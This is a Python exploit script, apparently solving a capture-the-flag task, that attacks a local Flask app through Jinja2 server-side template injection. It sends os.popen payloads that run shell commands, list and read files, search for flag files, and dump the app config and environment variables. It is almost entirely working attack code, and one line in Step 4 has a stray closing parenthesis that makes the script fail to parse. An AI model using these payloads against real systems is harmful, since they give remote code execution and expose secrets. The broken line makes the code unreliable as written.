import requests
import re
import html

def send_payload(payload):
    """Send SSTI payload to the target endpoint and return the response."""
    url = "http://127.0.0.1:33126/submit"
    data = {
        'name': payload,
        'email': 'test@example.com',
        'license': 'D123456'
    }
    
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            return response.text
        else:
            print(f"[!] HTTP Error: Status code {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
        return None

def extract_output(response_text):
    """Extract the command output from the response."""
    match = re.search(r'Thank you (.*?) for your submission\.', response_text, re.DOTALL)
    if match:
        output = match.group(1)
        output = html.unescape(output)
        return output.strip()
    return None

def extract_flag(text):
    """Search for FLAG{...} pattern in text."""
    flag_match = re.search(r'FLAG\{[^}]+\}', text)
    if flag_match:
        return flag_match.group(0)
    return None

def main():
    print("[+] Starting SSTI exploitation on http://127.0.0.1:33126/submit")
    print("[+] Target: Remote Code Execution via Jinja2 SSTI")
    print()
    
    # Step 1: Confirm RCE with a simple test
    print("[+] Step 1: Testing RCE with simple command...")
    test_payload = '{{ __builtins__.__import__("os").popen("echo pwned").read() }}'
    response = send_payload(test_payload)
    
    if response:
        output = extract_output(response)
        if output and 'pwned' in output:
            print(f"[+] RCE confirmed! Output: {output}")
        else:
            print(f"[!] RCE test failed. Got: {output}")
            return
    else:
        print("[!] Failed to get response")
        return
    
    print()
    
    # Step 2: List files in current directory
    print("[+] Step 2: Listing files in current directory...")
    list_payload = '{{ __builtins__.__import__("os").popen("ls -la").read() }}'
    response = send_payload(list_payload)
    
    if response:
        file_list = extract_output(response)
        print(f"[+] Files in current directory:\n{file_list}")
        print()
        
        if 'flag.txt' in file_list:
            print("[+] flag.txt found! Attempting to read it...")
            flag_payload = '{{ __builtins__.__import__("os").popen("cat flag.txt").read() }}'
            response = send_payload(flag_payload)
            if response:
                flag_content = extract_output(response)
                flag = extract_flag(flag_content)
                if flag:
                    print(f"[!] FLAG FOUND: {flag}")
                    return flag
    
    print()
    
    # Step 3: Test common flag paths
    print("[+] Step 3: Testing common flag paths...")
    common_paths = ['/flag.txt', '/app/flag.txt', './flag.txt', '/tmp/flag.txt', '/home/flag.txt', '/root/flag.txt']
    
    for path in common_paths:
        print(f"[+] Trying: {path}")
        payload = f'{{{{ __builtins__.__import__("os").popen("cat {path}").read() }}}}'
        response = send_payload(payload)
        
        if response:
            content = extract_output(response)
            flag = extract_flag(content)
            if flag:
                print(f"[!] FLAG FOUND: {flag}")
                return flag
            elif content and len(content.strip()) > 0:
                print(f"[+] File exists but no flag: {content[:100]}...")
    
    print()
    
    # Step 4: Find .txt files
    print("[+] Step 4: Searching for .txt files...")
    find_payload = '{{ __builtins__.__import__("os").popen("find . -name \"*.txt\" 2>/dev/null").read() }}'
    response = send_payload(find_payload)
    
    if response:
        txt_files = extract_output(response)
        if txt_files and len(txt_files.strip()) > 0:
            print(f"[+] Found .txt files:\n{txt_files}")
            
            for txt_file in txt_files.strip().split('\n'):
                txt_file = txt_file.strip()
                if txt_file:
                    cmd = f'cat "{txt_file}"'
                    payload = f'{{{{ __builtins__.__import__("os").popen("{cmd}").read() }}}}')
                    response = send_payload(payload)
                    
                    if response:
                        content = extract_output(response)
                        flag = extract_flag(content)
                        if flag:
                            print(f"[!] FLAG FOUND: {flag}")
                            return flag
        else:
            print("[+] No .txt files found")
    
    print()
    
    # Step 5: Check Flask config
    print("[+] Step 5: Checking Flask config...")
    config_payload = '{{ config }}'
    response = send_payload(config_payload)
    
    if response:
        config_output = extract_output(response)
        print(f"[+] Flask config:\n{config_output}")
        flag = extract_flag(config_output)
        if flag:
            print(f"[!] FLAG FOUND in config: {flag}")
            return flag
    
    print()
    
    # Step 6: Check environment
    print("[+] Step 6: Checking environment variables...")
    env_payload = '{{ __builtins__.__import__("os").environ }}'
    response = send_payload(env_payload)
    
    if response:
        env_output = extract_output(response)
        print(f"[+] Environment variables:\n{env_output}")
        flag = extract_flag(env_output)
        if flag:
            print(f"[!] FLAG FOUND in env: {flag}")
            return flag
    
    print("[!] Flag not found")
    return None

